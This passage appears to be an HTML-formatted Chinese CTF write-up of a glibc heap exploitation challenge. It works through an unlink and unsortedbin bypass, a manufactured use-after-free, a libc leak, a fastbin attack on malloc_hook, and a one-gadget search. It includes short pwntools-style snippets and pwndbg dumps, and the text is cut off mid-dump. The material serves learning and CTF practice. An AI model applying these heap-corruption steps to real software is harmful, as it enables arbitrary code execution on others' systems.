&lt;p&gt;这个是经典的套路了，利用 unsortedbins 的双链表绕过 unlink 的检查，成功的 chunk0 合并到 topchunk，作为新的 topchunk, 这个时候 chunk1 仍在使用，但是被包含进了 topchnk，那么我们下面如果重复申请 add (0x88),add (0x18), 就可以在 bss 的链表中两次利用了，人为的 uaf，这里的话呢，我写的 0x18 比较小，可以写大点，比如 0x88，然后重复申请后，有两个地方的指针指向这块区域，释放一个，用另外一个进行泄露（因为 0x91 的大小又被写进了 unsortedbins）这样有了 libc 的基地址。通过上述流程我们就是实现了人为的 uaf。如果我们话存在一个 0x70 大小的堆块的重复利用，就可以进行 fastbinsattack，将 malloc_hook-0x23 写入 fastbins，然后就可以可以申请出来实现 malloc_hook 的劫持。&lt;/p&gt;
&lt;p&gt;这个操作就很经典了，劫持 malloc_hook 后查看栈的结构，寻找满足要求的 onegadegt&lt;/p&gt;
&lt;h3 id=&#34;瞎操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#瞎操作&#34;&gt;#&lt;/a&gt; 瞎操作&lt;/h3&gt;
&lt;p&gt;我在第一次进行 unlink 操作时，因为不仅修改了后面堆块的堆头，还修改了假 tophcunk 的堆头，同样想利用 unsortedbin 的双链表绕过检查，但是失败了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xb0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x91&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是，却误打误撞的绕过了 unsortedbins 的检查，如果释放 1，然后修改他的 size（0x90—&amp;gt;0xb0）, 期望能够切割堆块 (0x90)，然后剩下的 0x20 会被加入对应的 bins，这里会报错我还没有搞清楚原因，报错的信息大概是 prevsize 不合法。&lt;/p&gt;
&lt;p&gt;然后我的瞎操作就饶过了一系列的检查，虽然没能构造新的 topchunk, 但是 chunk1 的紧邻堆块 2 是我们在使用的，当我们 add (0x88)，会对其进行切割，剩下的 0x20 会进入 unsortedbin 的双链表，而这剩下的就是我们使用的 chunk2，这样 chunk 的 fd,bk 指针指向 main_arena，这样既可以完成了泄露&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;unsortedbin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;all: &lt;span class=&#34;number&#34;&gt;0x55ad680a80b0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7f39d1cdab78&lt;/span&gt; (main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x55ad680a80b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;smallbins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;empty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;largebins&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;empty&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x55ad680a80b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x55ad680a80b0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000021&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后申请出来&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x55ad67ba8040&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000001800000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000055ad680a8010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x55ad67ba8050&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000008800000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000055ad680a8030&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x55ad67ba8060&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000001800000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000055ad680a80c0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x55ad67ba8070&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000001000000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000055ad680a80c0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;就可以重复利用，我们利用 chunk1 来修改 chunk 的 size（0x21----&amp;gt;0x71），这样当 chunk2 释放后门进入 fastbin, 利用 chunk3 修改 fd 指针，就把 malloc_hook 链接入 fastbins。free chnnk  进入 fastbins 时，要保证 chunk 的下一个 chunk 合法，但是只会检查 size，这里我直接申请一个堆块绕过，后面申请到 aimed_chunk 就比较简单了。&lt;/p&gt;
&lt;p&gt;最后就是这个 onegadegt 了，很不幸这里没有合适的&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;RAX  &lt;span class=&#34;number&#34;&gt;0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBX  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RCX  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDX  &lt;span class=&#34;number&#34;&gt;0x11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RDI  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSI  &lt;span class=&#34;number&#34;&gt;0x55fafa1d3cd1&lt;/span&gt; ◂— mov    qword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R8   &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R9   &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R10  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R11  &lt;span class=&#34;number&#34;&gt;0x7f55c10ef6e0&lt;/span&gt; (_nl_C_LC_CTYPE_class+&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;) ◂— add    al, byte ptr [rax]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R12  &lt;span class=&#34;number&#34;&gt;0x55fafa1d39a0&lt;/span&gt; ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R13  &lt;span class=&#34;number&#34;&gt;0x7ffc37dd49f0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R14  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; R15  &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RBP  &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RSP  &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; RIP  &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd028&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;680&lt;/span&gt;) ◂— call   rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ DISASM ]───────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd028&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;680&lt;/span&gt;&amp;gt;    call   rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd02a&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;682&lt;/span&gt;&amp;gt;    xor    esi, esi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd02c&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;684&lt;/span&gt;&amp;gt;    test   rax, rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd02f&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;687&lt;/span&gt;&amp;gt;    mov    rdx, rbp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd032&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;690&lt;/span&gt;&amp;gt;    mov    rdi, rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd035&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;693&lt;/span&gt;&amp;gt;    jne    &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;656&lt;/span&gt; &amp;lt;&lt;span class=&#34;number&#34;&gt;0x7f55c0ffd010&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd037&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;695&lt;/span&gt;&amp;gt;    xor    eax, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd039&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;697&lt;/span&gt;&amp;gt;    jmp    &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;312&lt;/span&gt; &amp;lt;&lt;span class=&#34;number&#34;&gt;0x7f55c0ffceb8&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd03e&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;702&lt;/span&gt;&amp;gt;    nop    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd040&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;704&lt;/span&gt;&amp;gt;    mov    rax, qword ptr [rip + &lt;span class=&#34;number&#34;&gt;0x33ee31&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x7f55c0ffd047&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;711&lt;/span&gt;&amp;gt;    mov    dword ptr fs:[rax], &lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;───────────────────────────────────[ STACK ]────────────────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ rsp  &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48a0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48a8&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48b0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48f0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffc37dd4910&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55fafa1d42c0&lt;/span&gt; ◂— push   r15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48b8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55fafa1d39a0&lt;/span&gt; ◂— xor    ebp, ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48c0&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x7ffc37dd49f0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0028&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48c8&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x55fafa1d3cd1&lt;/span&gt; ◂— mov    qword ptr [rbp - &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;], rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0030&lt;/span&gt;│      &lt;span class=&#34;number&#34;&gt;0x7ffc37dd48d0&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x7fa1d39a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 